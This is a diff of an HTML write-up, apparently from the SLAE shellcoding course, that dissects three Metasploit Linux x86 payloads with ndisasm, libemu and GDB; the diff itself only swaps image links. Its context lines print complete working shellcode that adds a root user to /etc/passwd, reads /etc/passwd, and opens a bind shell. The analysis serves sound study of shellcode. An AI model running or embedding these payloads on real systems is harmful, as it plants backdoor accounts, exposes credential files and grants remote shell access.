@@ -41,9 +41,9 @@ Payloads studied:<br>
 <br>
 <h3> Check options</h3>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/adduser --list-options</code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/1.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/1.png"><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/2.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/2.png"><br>
 <br>
 There are 3 basic options:<br>
 <br>
@@ -61,13 +61,13 @@ The fastest way to get the shellcode in my case was using two pipes, one with 's
 </code><br>
 Using it, we get the shellcode we will use for the study of the payload:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/3.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/3.png"><br>
 <br>
 <h3> Libemu</h3>
 <br>
 Libemu does not show any output in this case:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/4.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/4.png"><br>
 <br>
 When the png picture is generated it is empty.<br>
 <br>
@@ -79,18 +79,18 @@ With ndisasm it is possible to get the .nasm code using:<br>
 Or a little quicker:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/5.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/5.png"><br>
 <br>
 Using awk it is possible to get only the part we want and create a .nasm file:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -e "section .text\nglobal _start \n_start:" > 1.nasm
 
 echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 1.nasm
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/6.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/6.png"><br>
 <br>
 It seems ok:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/7.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/7.png"><br>
 <br>
 With a little bit of indentation, the nasm file is created and ready to be studied. <br>
 <br>
@@ -101,16 +101,16 @@ Given we have the nasm code, the first thing to do will be studying the differen
 <br>
 In this case we have four syscalls:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/8.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/8.png"><br>
 <br>
 The most important in this case is checking the value of the register EAX to check what type of syscall is being used. The two first syscalls seem to use the values 0x46 and 0x5 (we will check later using GDB):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/9.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/9.png"><br>
 <br>
 <br>
 The two last syscalls seem to use the values 0x4 and 0x1:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/10.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/10.png"><br>
 <br>
 <br>
 After checking the <i>/usr/include/i386-linux-gnu/asm/unistd_32.h</i> file, the syscalls seem to be:<br>
@@ -130,40 +130,40 @@ Before opening GDB, it may be a good idea to some hexadecimal values which could
 <br>
 There are some values used in the second syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/11.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/11.png"><br>
 <br>
 And one in the third<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/12.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/12.png"><br>
 <br>
 For this i wrote a simple script to translate the hexadecimal values to ascii:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/13.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/13.png"><br>
 <br>
 The values used in the second syscall are '/etc//passwd', while the value in the third does not seem to be an ascii value:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/14.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/14.png"><br>
 <br>
 <br>
 <h3> Generating the executable</h3>
 <br>
 Next, the executable gets generated using the <i>shellcode.c</i> script:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/15.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/15.png"><br>
 <br>
 It is compiled:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gcc -fno-stack-protector -z execstack shellcode.c -o 1
 </code><br>
 An executable named "1" gets generated. It is possible to execute it and check the "/etc/passwd" file to check if the user has been correctly generated.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/16.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/16.png"><br>
 <br>
 In this case, it was executed twice so there are two lines at the bottom of the file.<br>
 <br>
 <br>
 Also note that if we study the binary there are interesting strings we can find (this one will appear again later):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/17.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/17.png"><br>
 <br>
 <br>
 <h3> Study with GDB</h3>
@@ -172,39 +172,39 @@ First, the executable is attached in quiet mode:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gdb -q 1
 </code>Then, we set the disassembly flavor and jump into the "main" function (the one from shellcode.c):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/18.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/18.png"><br>
 <br>
 Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).<br>
 <br>
 We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/19.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/19.png"><br>
 <br>
 Now, all the shellcode with the four syscalls can be read:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/20.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/20.png"><br>
 <br>
 <br>
 <h3> Syscall 1</h3>
 <br>
 The first syscall is the one in 0x00404047, so we create a breakpoint in there and see the value of the registers:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/21.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/21.png"><br>
 <br>
 The EAX value is 70 so in fact it is a setreuid() syscall. The value of EBX and ECX registers is 0, so the the reak and effective user ID of the process will be 0:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/22.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/22.png"><br>
 <br>
 <br>
 <h3> Syscall 2</h3>
 <br>
 Next syscall is the one in 0x00404063, Before continuing a quick "hook-stop" is defined:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/23.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/23.png"><br>
 <br>
 Then, the next breakpoint is reached. <br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/24.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/24.png"><br>
 <br>
 The values are:<br>
 <br>
@@ -216,34 +216,34 @@ The values are:<br>
 <br>
 For understanding every value, the man page is read:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/25.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/25.png"><br>
 <br>
 <br>
 <h3> Syscall 3</h3>
 <br>
 Next, in the third syscall there is a "call" instruction to a function which we could not obtain using ndisasm:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/26.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/26.png"><br>
 <br>
 Before continuing to check the values in the next syscall, we must find out what this function does. We write the instructions from that point and realise the instructions are different to what gdb shows at first:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/27.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/27.png"><br>
 <br>
 I set a break point at 0x404093 and see the next instructions:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/28.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/28.png"><br>
 <br>
 We continue debugging and get to 0x00404099, the third syscall. At this point we are aware we "jumped" from 0x00404066 to 0x404092 and it seems we did nothing with those instructions. <br>
 <br>
 Well, we did! This is the string we found before using the <i>strings</i> command, containing the line we will add to /etc/passwd. After the "call", this string address is stored in the stack. Then, the instruction in 0x404092 pops its value and now ecx has that address.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/29.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/29.png"><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/30.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/30.png"><br>
 <br>
 We set a breakpoint in 0x00404099 and check the registers values:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/31.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/31.png"><br>
 <br>
 These are:<br>
 <br>
@@ -262,17 +262,17 @@ So, after this the file gets a new line.<br>
 <br>
 Finally, the fourth syscall is the EXIT call, which ends the program:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/32.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/32.png"><br>
 <br>
 <h3> Update/correct NASM file</h3>
 <br>
 Now we can update the nasm code deleting the unused opcodes and adding the string we found.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/33.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/33.png"><br>
 <br>
 Finally we can compile the nasm file and check it works correctly:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/adduser/34.png?raw=true"><br>
+<img src="visual/images/slae/5/adduser/34.png"><br>
 <br>
 <br>
 <br>
@@ -281,9 +281,9 @@ Finally we can compile the nasm file and check it works correctly:<br>
 <h3> Check options</h3>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/read_file --list-options
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/1.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/1.png"><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/2.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/2.png"><br>
 <br>
 <br>
 There are 3 basic options:<br>
@@ -303,14 +303,14 @@ The fastest way to get the shellcode in my case was using two pipes, one with 's
 </code><br>
 Using it, we get the shellcode we will use for the study of the payload:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/3.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/3.png"><br>
 <br>
 <br>
 <h3> Libemu</h3>
 <br>
 Libemu does not show any output in this case:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/4.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/4.png"><br>
 <br>
 When the png picture is generated it is empty.<br>
 <br>
@@ -324,14 +324,14 @@ Or a little quicker:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
 </code><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/5.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/5.png"><br>
 <br>
 Using awk it is possible to get only the part we want and create a .nasm file:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -e "section .text\nglobal _start \n_start:" > 2.nasm
 
 echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 2.nasm
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/6.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/6.png"><br>
 <br>
 <br>
 With a little bit of indentation, the nasm file is created and ready to be studied. <br>
@@ -343,7 +343,7 @@ Given we have the nasm code, the first thing to do will be studying the differen
 <br>
 In this case we have four syscalls:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/7.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/7.png"><br>
 <br>
 <br>
 After checking the <i>/usr/include/i386-linux-gnu/asm/unistd_32.h</i> file, the syscalls seem to be:<br>
@@ -362,19 +362,19 @@ After checking the <i>/usr/include/i386-linux-gnu/asm/unistd_32.h</i> file, the 
 <br>
 Next, the executable gets generated using the <i>shellcode.c</i> script:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/8.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/8.png"><br>
 <br>
 It is compiled:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gcc -fno-stack-protector -z execstack shellcode.c -o 2
 </code><br>
 An executable named "2" gets generated. It is possible to execute it and check the output:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/9.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/9.png"><br>
 <br>
 <br>
 Also note that if we study the binary there are interesting strings we can find (this one will appear again later):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/10.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/10.png"><br>
 <br>
 <br>
 <h3> Study with GDB</h3>
@@ -383,35 +383,35 @@ First, the executable is attached in quiet mode:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gdb -q 2
 </code>Then, we set the disassembly flavor, define the "hook-stop" function, and jump into the "main" function (the one from shellcode.c):<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/11.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/11.png"><br>
 <br>
 Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).<br>
 <br>
 We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the four syscalls can be read:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/12.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/12.png"><br>
 <br>
 <br>
 <h3> JMP-CALL-POP detected</h3>
 <br>
 In 0x00404040 there is a jump (JMP) to 0x404078 which immediately calls 0x00404042. This is obviously a JMP-CALL-POP so we will read the values after 0x404078, which contain "/etc/passwd"<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/13.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/13.png"><br>
 <br>
 Now, we will set a breakpoint before every syscall: 0x0040404a, 0x0040405c, 0x0040406a and 0x00404076.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/14.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/14.png"><br>
 <br>
 <br>
 <h3> Syscall 1</h3>
 <br>
 We reach the first syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/15.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/15.png"><br>
 <br>
 We read the man page of open:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/16.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/16.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -419,7 +419,7 @@ And then the values are:<br>
 <br>
 - EBX = 4210813 => The address of "/etc/passwd" string<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/17.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/17.png"><br>
 <br>
 - ECX = 0 => These are the flags values. In this case it is only needed the read permission.<br>
 <br>
@@ -428,11 +428,11 @@ And then the values are:<br>
 <br>
 We reach the second syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/18.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/18.png"><br>
 <br>
 We read the man page of read:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/19.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/19.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -449,7 +449,7 @@ And then the values are:<br>
 <br>
 We reach the third syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/20.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/20.png"><br>
 <br>
 We read the man page of write in here: https://linux.die.net/man/2/write<br>
 <br>
@@ -468,11 +468,11 @@ And then the values are:<br>
 <br>
 We reach the fourth syscall:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/21.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/21.png"><br>
 <br>
 We read the man page of exit:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/22.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/22.png"><br>
 <br>
 And then the values are:<br>
 <br>
@@ -484,11 +484,11 @@ And then the values are:<br>
 <br>
 Now we can update the nasm code deleting the unused opcodes and adding the string we found.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/24.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/24.png"><br>
 <br>
 Finally we can compile the nasm file and check it works correctly:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/read_file/25.png?raw=true"><br>
+<img src="visual/images/slae/5/read_file/25.png"><br>
 <br>
 <br>
 <br>
@@ -499,9 +499,9 @@ Finally we can compile the nasm file and check it works correctly:<br>
 <h3> Check options</h3>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/1.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/1.png"><br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/2.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/2.png"><br>
 <br>
 There is not any basic option in this case.<br>
 <br>
@@ -515,7 +515,7 @@ The fastest way to get the shellcode in my case was using two pipes, one with 's
 </code><br>
 Using it, we get the shellcode we will use for the study of the payload:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/3.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/3.png"><br>
 <br>
 <h3> Ndisasm</h3>
 <br>
@@ -527,14 +527,14 @@ Or a little quicker:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;
 ">echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/6.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/6.png"><br>
 <br>
 Using awk it is possible to get only the part we want and create a .nasm file:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -e "section .text\nglobal _start \n_start:" > 3.nasm
 
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/7.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/7.png"><br>
 <br>
 <br>
 <br>
@@ -543,7 +543,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 In this case Libemu works correctly:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/4.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/4.png"><br>
 <br>
 We get the next output:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">int socket (<br>
@@ -637,7 +637,7 @@ none;<br>
 Finally the png picture is created using:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">dot randbind.dot -T png -o randbind.png
 </code><br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/5.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/5.png"><br>
 <br>
 <br>
 <h3> Studying the syscalls</h3>
@@ -646,7 +646,7 @@ Given we have the nasm code, the first thing to do will be studying the differen
 <br>
 In this case we have five syscalls:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/8.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/8.png"><br>
 <br>
 After checking the <i>/usr/include/i386-linux-gnu/asm/unistd_32.h</i> file, the syscalls seem different to the ones we got using Libemu:<br>
 <br>
@@ -677,7 +677,7 @@ The nasm file states the list of syscalls is:<br>
 <br>
 So Libemu interprets which is the specific socket call in the first three syscalls.<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/9.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/9.png"><br>
 <br>
 <br>
 <br>
@@ -685,51 +685,51 @@ So Libemu interprets which is the specific socket call in the first three syscal
 <br>
 In this third case, it is possible to compile the NASM code and generate a working executable, but it crashes after connecting to the port:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/22.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/22.png"><br>
 <br>
 So again, itt is necessary to use the <i>shellcode.c</i> file:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/23.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/23.png"><br>
 <br>
 It is compiled:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gcc -fno-stack-protector -z execstack shellcode.c -o 3
 </code><br>
 An executable named "3" gets generated. It is possible to execute it and check that it works correctly:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/24.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/24.png"><br>
 <br>
 <br>
 Also it is possible to look for interesting strings like this one:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/11.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/11.png"><br>
 <br>
 <br>
 <h3> Study with GDB</h3>
 <br>
 We attach the executable in quiet mode, set the disassembly flavor, define the "hook-stop" function, run the program and stop in the main function:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/12.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/12.png"><br>
 <br>
 Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).<br>
 <br>
 We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the five syscalls can be read:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/12_5.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/12_5.png"><br>
 <br>
 We set breakpoint in every one of them:<br>
 <br>
-<img src="https://github.com/ricardojoserf/slae/blob/master/a5_Shellcode_Functionality/images/randbind/14.png?raw=true"><br>
+<img src="visual/images/slae/5/randbind/14.png"><br>
 <br>
 <br>
 <h4> Syscall 1</h4><br>
 <br>
 We reach the first syscall:<br>
 <br>
